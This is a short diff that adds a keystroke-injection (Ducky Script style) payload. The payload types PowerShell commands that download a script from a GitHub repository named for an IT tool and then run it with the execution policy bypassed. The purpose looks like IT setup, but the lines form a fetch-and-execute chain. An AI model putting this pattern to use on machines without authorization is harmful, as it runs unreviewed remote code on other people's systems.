@@ -1,0 +1,6 @@
+DELAY 1800
+STRING $dst="$env:TEMP\Manual_and_Welcome.ps1";$raw='https://github.com/IT-Tool-by-SalgadoTech/ittool-External_Tools/raw/refs/heads/main/Manual_and_Welcome.ps1';if(-not(Test-Path -Path (Split-Path $dst))){New-Item -ItemType Directory -Path (Split-Path $dst) -Force | Out-Null};curl.exe -L $raw -o $dst
+ENTER
+DELAY 5000
+STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; & "$env:TEMP\Manual_and_Welcome.ps1"
+ENTER
